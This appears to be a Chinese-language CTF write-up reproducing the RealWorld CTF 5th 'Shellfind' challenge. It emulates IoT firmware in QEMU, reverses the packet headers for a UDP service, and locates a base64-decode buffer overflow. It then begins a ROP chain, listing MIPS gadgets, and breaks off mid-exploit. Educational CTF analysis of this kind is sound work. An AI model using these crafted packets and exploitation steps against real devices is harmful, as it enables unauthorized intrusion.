---
title: RWCTF 5th Shellfind复现
url: https://www.secpulse.com/archives/195239.html
source: 安全脉搏
date: 2023-02-02
fetch_date: 2025-10-04T05:28:36.479742
---

# RWCTF 5th Shellfind复现

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# RWCTF 5th Shellfind复现

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[ChaMd5安全团队](https://www.secpulse.com/newpage/author?author_id=3747)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-02-01

15,152

### 前言

RealWorld CTF 5th 里的一道iot-pwn，根据真实设备固件改编而成，觉得题目贴近iot实战且很有意思，故在此记录一下复现过程。

### 题目分析

#### 题目描述

```
Hello Hacker.
You don't know me, but I know you.
I want to play a game. Here's what happens if you lose.
The device you are watching is hooked into your Saturday and Sunday.
When the timer in the back goes off,
your curiosity will be permanently ripped open.
Think of it like a reverse bear trap.
Here, I'll show you.
There is only one UDP service to shell the device.
It's in the stomach of your cold firmware.
Look around Hacker. Know that I'm not lying.
Better hurry up.
Shell or out, make your choice.
```

从中可以看出漏洞大概率存在于`UDP`服务中。

#### 固件分析

拿到手的是一个`bin包`，解压出来可以得到一个完整的文件系统。相比于常规pwn题单一的二进制而言，我们首先要做的是寻找漏洞文件。既然是真实设备改编那我们就可以先在网上找一找官方固件并尝试下载最新版本。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143863.png)

下载到官方的固件后，可以采取`bindiff`等方法去找被修改过的二进制文件。可以初步判定漏洞应该是出在`ipfind`程序中。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-16751438631.png)

并且发现此固件为`mips大端`，且可疑漏洞文件没开保护。

#### 固件模拟

我是直接用`qemu`去模拟的这个固件，当然也可以尝试用`FirmAE`，`firmadyne`，`firmware-analysis-plus`等工具去进行模拟。我的`qemu`启动脚本如下：

```
sudo ifconfig ens33 down
sudo brctl addbr br0
sudo brctl addif br0 ens33
sudo ifconfig br0 0.0.0.0 promisc up
sudo ifconfig ens33 0.0.0.0 promisc up
sudo dhclient br0
sudo tunctl -t tap0
sudo brctl addif br0 tap0
sudo ifconfig tap0 0.0.0.0 promisc up
sudo qemu-system-mips
    -M malta -kernel vmlinux-3.2.0-4-4kc-malta
    -hda debian_wheezy_mips_standard.qcow2
    -append "root=/dev/sda1 console=tty0"
    -net nic,macaddr=00:16:3e:00:00:01
    -net tap,ifname=tap0,script=no,downscript=no
    -nographic
```

启动完成之后用`scp`把固件包、gdbserver、完整的busybox等传上去。之后用如下命令切换到固件包根目录进行操作:

```
mount -t proc /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev
chroot ./squashfs-root/ sh
```

之后通过`/etc/rc.d/rcS`初始化服务。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143864.png)

启动完成之后通过`./busybox-mips netstat -pantu`去查看开放的端口及对应的二进制文件。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-16751438641.png)

可以看到我们之前分析的可疑文件`ipfind`正是`UDP`服务，开放端口为`62720`。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143865.png)

值得注意的是我们用`ps`去查看进程发现执行的是`/usr/sbin/ipfind br0`这个命令，但我`qemu`的有效网卡是`eth0`，这样以后我们会发现无法使用`gdbserver`进行调试，故我们要杀死该进程，并执行`/usr/sbin/ipfind eth0 &`，这样我们就可以使用gdbserver进行愉快的调试了。

#### 漏洞文件分析

首先是建立`socket通信`并绑定到`62720端口`，与刚才看到的端口一致。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143867.png)

接着从client端接收数据，并进行一系列的操作。之后会对数据进行一个判断，以此来确定是否进入`sub_40172C函数`或`sub_4013F4函数`。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-16751438671.png)

##### sub\_40172C函数

想进入这个函数我们可以逆出来它所需接受的内容开头应该为:

```
header1 = b"FIVI"
header1+= b"x00x00x00x00"
header1+= b"x0Ax01x00x00"
header1+= b"x00x00x00x00"
header1+= b"x00"
header1+= b"xFFxFFxFFxFFxFFxFF"
header1+= b"x00x00"
header1+= b"x00x00x00x00"
```

这个函数会调用`sub_400E50`得到`net_get_hwaddr(ifname, a1 + 17)`，实际上就是`mac addr`（`qemu`启动时可以进行设置，之后打印出来对比一下即可），并把它发送到`client端`。这个值对于我们进入第二个函数必不可少。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143869.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-16751438691.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143870.png)

##### sub\_4013F4函数

想进入这个函数我们可以逆出来它所需接受的内容开头应该为:

```
header2 = b"FIVI"
header2+= b"x00x00x00x00"
header2+= b"x0Ax02x00x00"
header2+= b"x00x00x00x00"
header2+= b"x00"
header2+= mac
header2+= b"x00x00"
header2+= b"x8Ex00x00x00"
```

进入这个函数后，我们即可找到我们的漏洞函数`sub_400F50`，这个函数有两次`base64 decode`，第二次解码时会发生缓冲区溢出。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195239-1675143871.png)

漏洞利用

因为没开保护，我们布置好`rop`跳到`shellcode`上即可。但是我们由于没有`libc`地址，我们需要花费一定时间在`ipfind`这个文件里去找`gadgets`进行利用。

我们想要跳转到`shellcode`上执行，那么我们就需要可以泄露栈地址的`gadget`，于是我们找到了如下的`gadget`来泄露栈地址：

```
.text:004013D0 sub_4013D0:                              # CODE XREF: sub_4013F4+9C↓p
.text:004013D0                                          # sub_4013F4+160↓p ...
.text:004013D0
.text:004013D0 var_8           = -8
.text:004013D0 arg_4           =  4
.text:004013D0 arg_8           =  8
.text:004013D0 arg_C           =  0xC
.text:004013D0
.text:004013D0                 addiu   $sp, -0x10
.text:004013D4                 sw      $a1, 0x10+arg_4($sp)
.text:004013D8                 sw      $a2, 0x10+arg_8($sp)
.text:004013DC                 sw      $a3, 0x10+arg_C($sp)
.text:004013E0                 addiu   $v0, $sp, 0x10+arg_4
.text:004013E4                 sw      $v0, 0x10+var_8($sp)
.text:004013E8                 addiu   $sp, 0x10
.text:004013EC                 jr      $ra
.text:004013F0                 nop
```

这个`gadget`可以控制`v0`为栈地址，我们向上交叉引用找到一个既能控制`ra`又不改变`v0`的`gadget`下：

```
.text:00401F98                 jal     sub_4013D0
.text:00401F9C                 li      $a0, aCanTGetHelloSo  # "Can't get hello socketn"
.text:00401FA0                 b       loc_4020B4
.text:00401FA4                 nop

.text:004020B4 loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j
.text:004020B4                                          # sub_401...